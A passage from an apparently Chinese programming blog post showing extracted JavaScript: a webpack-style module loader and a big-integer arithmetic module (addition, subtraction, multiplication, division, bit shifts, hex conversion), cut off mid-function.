href="#三、完整代码" class="headerlink" title="三、完整代码"></a>三、完整代码</h1><p>几百行就搞定了，本身还是比较简单的！</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> _b</span><br><span class="line"></span><br><span class="line">!<span class="keyword">function</span>(<span class="params">n</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> c = &#123;&#125;;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">b</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;--&gt;&#x27;</span>,e)</span><br><span class="line">        <span class="keyword">var</span> s = c[e];</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">void</span> <span class="number">0</span> !== s)</span><br><span class="line">            <span class="keyword">return</span> s.<span class="property">exports</span>;</span><br><span class="line">        <span class="keyword">var</span> i = c[e] = &#123;</span><br><span class="line">            <span class="attr">id</span>: e,</span><br><span class="line">            <span class="attr">loaded</span>: !<span class="number">1</span>,</span><br><span class="line">            <span class="attr">exports</span>: &#123;&#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> n[e].<span class="title function_">call</span>(i.<span class="property">exports</span>, i, i.<span class="property">exports</span>, b),</span><br><span class="line">        i.<span class="property">loaded</span> = !<span class="number">0</span>,</span><br><span class="line">        i.<span class="property">exports</span></span><br><span class="line">    &#125;</span><br><span class="line">  _b = b</span><br><span class="line">&#125;(&#123;</span><br><span class="line">  <span class="comment">//模块</span></span><br><span class="line">  <span class="number">87377</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">        <span class="string">&quot;use strict&quot;</span>;</span><br><span class="line">        <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(t, <span class="string">&quot;__esModule&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">value</span>: !<span class="number">0</span></span><br><span class="line">        &#125;),</span><br><span class="line">        t.<span class="property">default</span> = <span class="keyword">void</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">var</span> n, r, o, a = <span class="number">16</span>, u = a, l = <span class="number">65536</span>, c = l &gt;&gt;&gt; <span class="number">1</span>, s = l * l, d = l - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            n = <span class="keyword">new</span> <span class="title class_">Array</span>(e);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="number">0</span>; t &lt; n.<span class="property">length</span>; t++)</span><br><span class="line">                n[t] = <span class="number">0</span>;</span><br><span class="line">            r = <span class="keyword">new</span> p,</span><br><span class="line">            (o = <span class="keyword">new</span> p).<span class="property">digits</span>[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_">f</span>(<span class="number">20</span>);</span><br><span class="line">        <span class="title function_">g</span>(<span class="number">1e15</span>);</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">p</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">digits</span> = <span class="string">&quot;boolean&quot;</span> == <span class="keyword">typeof</span> e &amp;&amp; <span class="number">1</span> == e ? <span class="literal">null</span> : n.<span class="title function_">slice</span>(<span class="number">0</span>),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">isNeg</span> = !<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">m</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="keyword">new</span> <span class="title function_">p</span>(!<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">return</span> t.<span class="property">digits</span> = e.<span class="property">digits</span>.<span class="title function_">slice</span>(<span class="number">0</span>),</span><br><span class="line">            t.<span class="property">isNeg</span> = e.<span class="property">isNeg</span>,</span><br><span class="line">            t</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">g</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="keyword">new</span> p;</span><br><span class="line">            t.<span class="property">isNeg</span> = e &lt; <span class="number">0</span>,</span><br><span class="line">            e = <span class="title class_">Math</span>.<span class="title function_">abs</span>(e);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> n = <span class="number">0</span>; e &gt; <span class="number">0</span>; )</span><br><span class="line">                t.<span class="property">digits</span>[n++] = e &amp; d,</span><br><span class="line">                e &gt;&gt;= a;</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">h</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="string">&quot;&quot;</span>, n = e.<span class="property">length</span> - <span class="number">1</span>; n &gt; -<span class="number">1</span>; --n)</span><br><span class="line">                t += e.<span class="title function_">charAt</span>(n);</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> _ = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>,<span class="string">&quot;3&quot;</span>,<span class="string">&quot;4&quot;</span>,<span class="string">&quot;5&quot;</span>,<span class="string">&quot;6&quot;</span>,<span class="string">&quot;7&quot;</span>,<span class="string">&quot;8&quot;</span>,<span class="string">&quot;9&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;f&quot;</span>,<span class="string">&quot;g&quot;</span>,<span class="string">&quot;h&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;j&quot;</span>,<span class="string">&quot;k&quot;</span>,<span class="string">&quot;l&quot;</span>,<span class="string">&quot;m&quot;</span>,<span class="string">&quot;n&quot;</span>,<span class="string">&quot;o&quot;</span>,<span class="string">&quot;p&quot;</span>,<span class="string">&quot;q&quot;</span>,<span class="string">&quot;r&quot;</span>,<span class="string">&quot;s&quot;</span>,<span class="string">&quot;t&quot;</span>,<span class="string">&quot;u&quot;</span>,<span class="string">&quot;v&quot;</span>,<span class="string">&quot;w&quot;</span>,<span class="string">&quot;x&quot;</span>,<span class="string">&quot;y&quot;</span>,<span class="string">&quot;z&quot;</span>);</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">T</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n = <span class="keyword">new</span> p;</span><br><span class="line">            n.<span class="property">digits</span>[<span class="number">0</span>] = t;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> o = <span class="title function_">x</span>(e, n), i = _[o[<span class="number">1</span>].<span class="property">digits</span>[<span class="number">0</span>]]; <span class="number">1</span> == <span class="title function_">G</span>(o[<span class="number">0</span>], r); )</span><br><span class="line">                o = <span class="title function_">x</span>(o[<span class="number">0</span>], n),</span><br><span class="line">                digit = o[<span class="number">1</span>].<span class="property">digits</span>[<span class="number">0</span>],</span><br><span class="line">                i += _[o[<span class="number">1</span>].<span class="property">digits</span>[<span class="number">0</span>]];</span><br><span class="line">            <span class="keyword">return</span> (e.<span class="property">isNeg</span> ? <span class="string">&quot;-&quot;</span> : <span class="string">&quot;&quot;</span>) + <span class="title function_">h</span>(i)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> E = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>,<span class="string">&quot;3&quot;</span>,<span class="string">&quot;4&quot;</span>,<span class="string">&quot;5&quot;</span>,<span class="string">&quot;6&quot;</span>,<span class="string">&quot;7&quot;</span>,<span class="string">&quot;8&quot;</span>,<span class="string">&quot;9&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;f&quot;</span>);</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">y</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">                t += E[<span class="number">15</span> &amp; e],</span><br><span class="line">                e &gt;&gt;&gt;= <span class="number">4</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">h</span>(t)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">S</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="string">&quot;&quot;</span>, n = (<span class="title function_">I</span>(e),</span><br><span class="line">            <span class="title function_">I</span>(e)); n &gt; -<span class="number">1</span>; --n)</span><br><span class="line">                t += <span class="title function_">y</span>(e.<span class="property">digits</span>[n]);</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">v</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> e &gt;= <span class="number">48</span> &amp;&amp; e &lt;= <span class="number">57</span> ? e - <span class="number">48</span> : e &gt;= <span class="number">65</span> &amp;&amp; e &lt;= <span class="number">90</span> ? <span class="number">10</span> + e - <span class="number">65</span> : e &gt;= <span class="number">97</span> &amp;&amp; e &lt;= <span class="number">122</span> ? <span class="number">10</span> + e - <span class="number">97</span> : <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">A</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="number">0</span>, n = <span class="title class_">Math</span>.<span class="title function_">min</span>(e.<span class="property">length</span>, <span class="number">4</span>), r = <span class="number">0</span>; r &lt; n; ++r)</span><br><span class="line">                t &lt;&lt;= <span class="number">4</span>,</span><br><span class="line">                t |= <span class="title function_">v</span>(e.<span class="title function_">charCodeAt</span>(r));</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">C</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="keyword">new</span> p, n = e.<span class="property">length</span>, r = <span class="number">0</span>; n &gt; <span class="number">0</span>; n -= <span class="number">4</span>,</span><br><span class="line">            ++r)</span><br><span class="line">                t.<span class="property">digits</span>[r] = <span class="title function_">A</span>(e.<span class="title function_">substr</span>(<span class="title class_">Math</span>.<span class="title function_">max</span>(n - <span class="number">4</span>, <span class="number">0</span>), <span class="title class_">Math</span>.<span class="title function_">min</span>(n, <span class="number">4</span>)));</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">b</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="string">&quot;&quot;</span>, n = <span class="title function_">I</span>(e); n &gt; -<span class="number">1</span>; --n)</span><br><span class="line">                t += <span class="title function_">D</span>(e.<span class="property">digits</span>[n]);</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">D</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">255</span> &amp; e);</span><br><span class="line">            <span class="keyword">return</span> e &gt;&gt;&gt;= <span class="number">8</span>,</span><br><span class="line">            <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">255</span> &amp; e) + t</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">P</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n;</span><br><span class="line">            <span class="keyword">if</span> (e.<span class="property">isNeg</span> != t.<span class="property">isNeg</span>)</span><br><span class="line">                t.<span class="property">isNeg</span> = !t.<span class="property">isNeg</span>,</span><br><span class="line">                n = <span class="title function_">O</span>(e, t),</span><br><span class="line">                t.<span class="property">isNeg</span> = !t.<span class="property">isNeg</span>;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                n = <span class="keyword">new</span> p;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> r, o = <span class="number">0</span>, i = <span class="number">0</span>; i &lt; e.<span class="property">digits</span>.<span class="property">length</span>; ++i)</span><br><span class="line">                    r = e.<span class="property">digits</span>[i] + t.<span class="property">digits</span>[i] + o,</span><br><span class="line">                    n.<span class="property">digits</span>[i] = <span class="number">65535</span> &amp; r,</span><br><span class="line">                    o = <span class="title class_">Number</span>(r &gt;= l);</span><br><span class="line">                n.<span class="property">isNeg</span> = e.<span class="property">isNeg</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">O</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n;</span><br><span class="line">            <span class="keyword">if</span> (e.<span class="property">isNeg</span> != t.<span class="property">isNeg</span>)</span><br><span class="line">                t.<span class="property">isNeg</span> = !t.<span class="property">isNeg</span>,</span><br><span class="line">                n = <span class="title function_">P</span>(e, t),</span><br><span class="line">                t.<span class="property">isNeg</span> = !t.<span class="property">isNeg</span>;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">var</span> r, o;</span><br><span class="line">                n = <span class="keyword">new</span> p,</span><br><span class="line">                o = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; e.<span class="property">digits</span>.<span class="property">length</span>; ++i)</span><br><span class="line">                    r = e.<span class="property">digits</span>[i] - t.<span class="property">digits</span>[i] + o,</span><br><span class="line">                    n.<span class="property">digits</span>[i] = <span class="number">65535</span> &amp; r,</span><br><span class="line">                    n.<span class="property">digits</span>[i] &lt; <span class="number">0</span> &amp;&amp; (n.<span class="property">digits</span>[i] += l),</span><br><span class="line">                    o = <span class="number">0</span> - <span class="title class_">Number</span>(r &lt; <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">if</span> (-<span class="number">1</span> == o) &#123;</span><br><span class="line">                    o = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; e.<span class="property">digits</span>.<span class="property">length</span>; ++i)</span><br><span class="line">                        r = <span class="number">0</span> - n.<span class="property">digits</span>[i] + o,</span><br><span class="line">                        n.<span class="property">digits</span>[i] = <span class="number">65535</span> &amp; r,</span><br><span class="line">                        n.<span class="property">digits</span>[i] &lt; <span class="number">0</span> &amp;&amp; (n.<span class="property">digits</span>[i] += l),</span><br><span class="line">                        o = <span class="number">0</span> - <span class="title class_">Number</span>(r &lt; <span class="number">0</span>);</span><br><span class="line">                    n.<span class="property">isNeg</span> = !e.<span class="property">isNeg</span></span><br><span class="line">                &#125; <span class="keyword">else</span></span><br><span class="line">                    n.<span class="property">isNeg</span> = e.<span class="property">isNeg</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">I</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> t = e.<span class="property">digits</span>.<span class="property">length</span> - <span class="number">1</span>; t &gt; <span class="number">0</span> &amp;&amp; <span class="number">0</span> == e.<span class="property">digits</span>[t]; )</span><br><span class="line">                --t;</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">L</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t, n = <span class="title function_">I</span>(e), r = e.<span class="property">digits</span>[n], o = (n + <span class="number">1</span>) * u;</span><br><span class="line">            <span class="keyword">for</span> (t = o; t &gt; o - u &amp;&amp; <span class="number">0</span> == (<span class="number">32768</span> &amp; r); --t)</span><br><span class="line">                r &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">R</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> n, r, o, i = <span class="keyword">new</span> p, u = <span class="title function_">I</span>(e), l = <span class="title function_">I</span>(t), c = <span class="number">0</span>; c &lt;= l; ++c) &#123;</span><br><span class="line">                n = <span class="number">0</span>,</span><br><span class="line">                o = c;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> s = <span class="number">0</span>; s &lt;= u; ++s,</span><br><span class="line">                ++o)</span><br><span class="line">                    r = i.<span class="property">digits</span>[o] + e.<span class="property">digits</span>[s] * t.<span class="property">digits</span>[c] + n,</span><br><span class="line">                    i.<span class="property">digits</span>[o] = r &amp; d,</span><br><span class="line">                    n = r &gt;&gt;&gt; a;</span><br><span class="line">                i.<span class="property">digits</span>[c + u + <span class="number">1</span>] = n</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> i.<span class="property">isNeg</span> = e.<span class="property">isNeg</span> != t.<span class="property">isNeg</span>,</span><br><span class="line">            i</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">N</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n, r, o, i;</span><br><span class="line">            i = <span class="keyword">new</span> p,</span><br><span class="line">            n = <span class="title function_">I</span>(e),</span><br><span class="line">            r = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> u = <span class="number">0</span>; u &lt;= n; ++u)</span><br><span class="line">                o = i.<span class="property">digits</span>[u] + e.<span class="property">digits</span>[u] * t + r,</span><br><span class="line">                i.<span class="property">digits</span>[u] = o &amp; d,</span><br><span class="line">                r = o &gt;&gt;&gt; a;</span><br><span class="line">            <span class="keyword">return</span> i.<span class="property">digits</span>[<span class="number">1</span> + n] = r,</span><br><span class="line">            i</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">w</span>(<span class="params">e, t, n, r, o</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="title class_">Math</span>.<span class="title function_">min</span>(t + o, e.<span class="property">length</span>), a = t, u = r; a &lt; i; ++a,</span><br><span class="line">            ++u)</span><br><span class="line">                n[u] = e[a]</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> k = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0</span>,<span class="number">32768</span>,<span class="number">49152</span>,<span class="number">57344</span>,<span class="number">61440</span>,<span class="number">63488</span>,<span class="number">64512</span>,<span class="number">65024</span>,<span class="number">65280</span>,<span class="number">65408</span>,<span class="number">65472</span>,<span class="number">65504</span>,<span class="number">65520</span>,<span class="number">65528</span>,<span class="number">65532</span>,<span class="number">65534</span>,<span class="number">65535</span>);</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">M</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n = <span class="title class_">Math</span>.<span class="title function_">floor</span>(t / u)</span><br><span class="line">              , r = <span class="keyword">new</span> p;</span><br><span class="line">            <span class="title function_">w</span>(e.<span class="property">digits</span>, <span class="number">0</span>, r.<span class="property">digits</span>, n, r.<span class="property">digits</span>.<span class="property">length</span> - n);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> o = t % u, i = u - o, a = r.<span class="property">digits</span>.<span class="property">length</span> - <span class="number">1</span>, l = a - <span class="number">1</span>; a &gt; <span class="number">0</span>; --a,</span><br><span class="line">            --l)</span><br><span class="line">                r.<span class="property">digits</span>[a] = r.<span class="property">digits</span>[a] &lt;&lt; o &amp; d | (r.<span class="property">digits</span>[l] &amp; k[o]) &gt;&gt;&gt; i;</span><br><span class="line">            <span class="keyword">return</span> r.<span class="property">digits</span>[<span class="number">0</span>] = r.<span class="property">digits</span>[a] &lt;&lt; o &amp; d,</span><br><span class="line">            r.<span class="property">isNeg</span> = e.<span class="property">isNeg</span>,</span><br><span class="line">            r</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> Y = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">15</span>,<span class="number">31</span>,<span class="number">63</span>,<span class="number">127</span>,<span class="number">255</span>,<span class="number">511</span>,<span class="number">1023</span>,<span class="number">2047</span>,<span class="number">4095</span>,<span class="number">8191</span>,<span class="number">16383</span>,<span class="number">32767</span>,<span class="number">65535</span>);</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">F</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n = <span class="title class_">Math</span>.<span class="title function_">floor</span>(t / u)</span><br><span class="line">              , r = <span class="keyword">new</span> p;</span><br><span class="line">            <span class="title function_">w</span>(e.<span class="property">digits</span>, n, r.<span class="property">digits</span>, <span class="number">0</span>, e.<span class="property">digits</span>.<span class="property">length</span> - n);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> o = t % u, i = u - o, a = <span class="number">0</span>, l = a + <span class="number">1</span>; a &lt; r.<span class="property">digits</span>.<span class="property">length</span> - <span class="number">1</span>; ++a,</span><br><span class="line">            ++l)</span><br><span class="line">                r.<span class="property">digits</span>[a] = r.<span class="property">digits</span>[a] &gt;&gt;&gt; o | (r.<span class="property">digits</span>[l] &amp; Y[o]) &lt;&lt; i;</span><br><span class="line">            <span class="keyword">return</span> r.<span class="property">digits</span>[r.<span class="property">digits</span>.<span class="property">length</span> - <span class="number">1</span>] &gt;&gt;&gt;= o,</span><br><span class="line">            r.<span class="property">isNeg</span> = e.<span class="property">isNeg</span>,</span><br><span class="line">            r</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">H</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n = <span class="keyword">new</span> p;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">w</span>(e.<span class="property">digits</span>, <span class="number">0</span>, n.<span class="property">digits</span>, t, n.<span class="property">digits</span>.<span class="property">length</span> - t),</span><br><span class="line">            n</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">U</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n = <span class="keyword">new</span> p;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">w</span>(e.<span class="property">digits</span>, t, n.<span class="property">digits</span>, <span class="number">0</span>, n.<span class="property">digits</span>.<span class="property">length</span> - t),</span><br><span class="line">            n</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">B</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n = <span class="keyword">new</span> p;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">w</span>(e.<span class="property">digits</span>, <span class="number">0</span>, n.<span class="property">digits</span>, <span class="number">0</span>, t),</span><br><span class="line">            n</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">G</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (e.<span class="property">isNeg</span> != t.<span class="property">isNeg</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span> - <span class="number">2</span> * <span class="title class_">Number</span>(e.<span class="property">isNeg</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> n = e.<span class="property">digits</span>.<span class="property">length</span> - <span class="number">1</span>; n &gt;= <span class="number">0</span>; --n)</span><br><span class="line">                <span class="keyword">if</span> (e.<span class="property">digits</span>[n] != t.<span class="property">digits</span>[n])</span><br><span class="line">                    <span class="keyword">return</span> e.<span class="property">isNeg</span> ? <span class="number">1</span> - <span class="number">2</span> * <span class="title class_">Number</span>(e.<span class="property">digits</span>[n] &gt; t.<span class="property">digits</span>[n]) : <span class="number">1</span> - <span class="number">2</span> * <span class="title class_">Number</span>(e.<span class="property">digits</span>[n] &lt; t.<span class="property">digits</span>[n]);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">x</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n, r, i = <span class="title function_">L</span>(e), a = <span class="title function_">L</span>(t), f = t.<span class="property">isNeg</span>;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; a)</span><br><span class="line">                <span class="keyword">return</span> e.<span class="property">isNeg</span> ? ((n = <span class="title function_">m</span>(o)).<span class="property">isNeg</span> = !t.<span class="property">isNeg</span>,</span><br><span class="line">                e.<span class="property">isNeg</span> = !<span class="number">1</span>,</span><br><span class="line">                t.<span class="property">isNeg</span> = !<span class="number">1</span>,</span><br><span class="line">                r = <span class="title function_">O</span>(t, e),</span><br><span class="line">                e.<span class="property">isNeg</span> = !<span class="number">0</span>,</span><br><span class="line">                t.<span class="property">isNeg</span> = f) : (n = <span class="keyword">new</span> p,</span><br><span class="line">                r = <span class="title function_">m</span>(e)),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Array</span>(n,r);</span><br><span class="line">            n = <span class="keyword">new</span> p,</span><br><span class="line">            r = e;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> g = <span class="title class_">Math</span>.<span class="title function_">ceil</span>(a / u) - <span class="number">1</span>, h = <span class="number">0</span>; t.<span class="property">digits</span>[g] &lt; c; )</span><br><span class="line">                t = <span class="title function_">M</span>(t, <span class="number">1</span>),</span><br><span class="line">                ++h,</span><br><span class="line">                ++a,</span><br><span class="line">                g = <span class="title class_">Math</span>.<span class="title function_">ceil</span>(a / u) - <span class="number">1</span>;</span><br><span class="line">            r = <span class="title function_">M</span>(r, h),</span><br><span class="line">            i += h;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> _ = <span class="title class_">Math</span>.<span class="title function_">ceil</span>(i / u) - <span class="number">1</span>, T = <span class="title function_">H</span>(t, _ - g); -<span class="number">1</span> != <span class="title function_">G</span>(r, T); )</span><br><span class="line">                ++n.<span class="property">digits</span>[_ - g],</span><br><span class="line">                r = <span class="title function_">O</span>(r, T);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> E = _; E &gt; g; --E) &#123;</span><br><span class="line">                <span class="keyword">var</span> y = E &gt;= r.<span class="property">digits</span>.<span class="property">length</span> ? <span class="number">0</span> : r.<span class="property">digits</span>[E]</span><br><span class="line">                  , S = E - <span class="number">1</span> &gt;= r.<span class="property">digits</span>.<span class="property">length</span> ? <span class="number">0</span> : r.<span class="property">digits</span>[E - <span class="number">1</span>]</span><br><span class="line">                  , v = E - <span class="number">2</span> &gt;= r.<span class="property">digits</span>.<span class="property">length</span> ? <span class="number">0</span> : r.<span class="property">digits</span>[E - <span class="number">2</span>]</span><br><span class="line">                  , A = g &gt;= t.<span class="property">digits</span>.<span class="property">length</span> ? <span class="number">0</span> : t.<span class="property">digits</span>[g]</span><br><span class="line">                  , C = g - <span class="number">1</span> &gt;= t.<span class="property">digits</span>.<span class="property">length</span> ? <span class="number">0</span> : t.<span class="property">digits</span>[g - <span class="number">1</span>];</span><br><span class="line">                n.<span class="property">digits</span>[E - g - <span class="number">1</span>] = y == A ? d : <span class="title class_">Math</span>.<span class="title function_">floor</span>((y * l + S) / A);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> b = n.<span class="property">digits</span>[E - g - <span class="number">1</span>] * (A * l + C), D = y * s + (S * l + v); b &gt; D; )</span><br><span class="line">                    --n.<span class="property">digits</span>[E - g - <span class="number">1</span>],</span><br><span class="line">                    b = n.<span class="property">digits</span>[E - g - <span class="number">1</span>] * (A * l | C),</span><br><span class="line">                    D = y * l * l + (S * l + v);</span><br><span class="line">                (r = <span class="title function_">O</span>(r, <span class="title function_">N</span>(T = <span class="title function_">H</span>(t, E - g - <span class="number">1</span>), n.<span class="property">digits</span>[E - g - <span class="number">1</span>]))).<span class="property">isNeg</span> &amp;&amp; (r = <span class="title function_">P</span>(r, T),</span><br><span class="line">                --n.<span class="property">digits</span>[E - g - <span class="number">1</span>])</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> r = <span class="title function_">F</span>(r, h),</span><br><span class="line">            n.<span class="property">isNeg</span> = e.<span class="property">isNeg</span> != f,</span><br><span class="line">            e.<span class="property">isNeg</span> &amp;&amp; (n = f ? <span class="title function_">P</span>(n, o) : <span class="title function_">O</span>(n, o),</span><br><span class="line">            r = <span class="title function_">O</span>(t = <span class="title function_">F</span>(t, h), r)),</span><br><span class="line">            <span class="number">0</span> == r.<span class="property">digits</span>[<span class="number">0</span>] &amp;&amp; <span class="number">0</span> == <span class="title function_">I</span>(r) &amp;&amp; (r.<span class="property">isNeg</span> = !<span class="number">1</span>),</span><br><span class="line">            <span class="keyword">new</span> 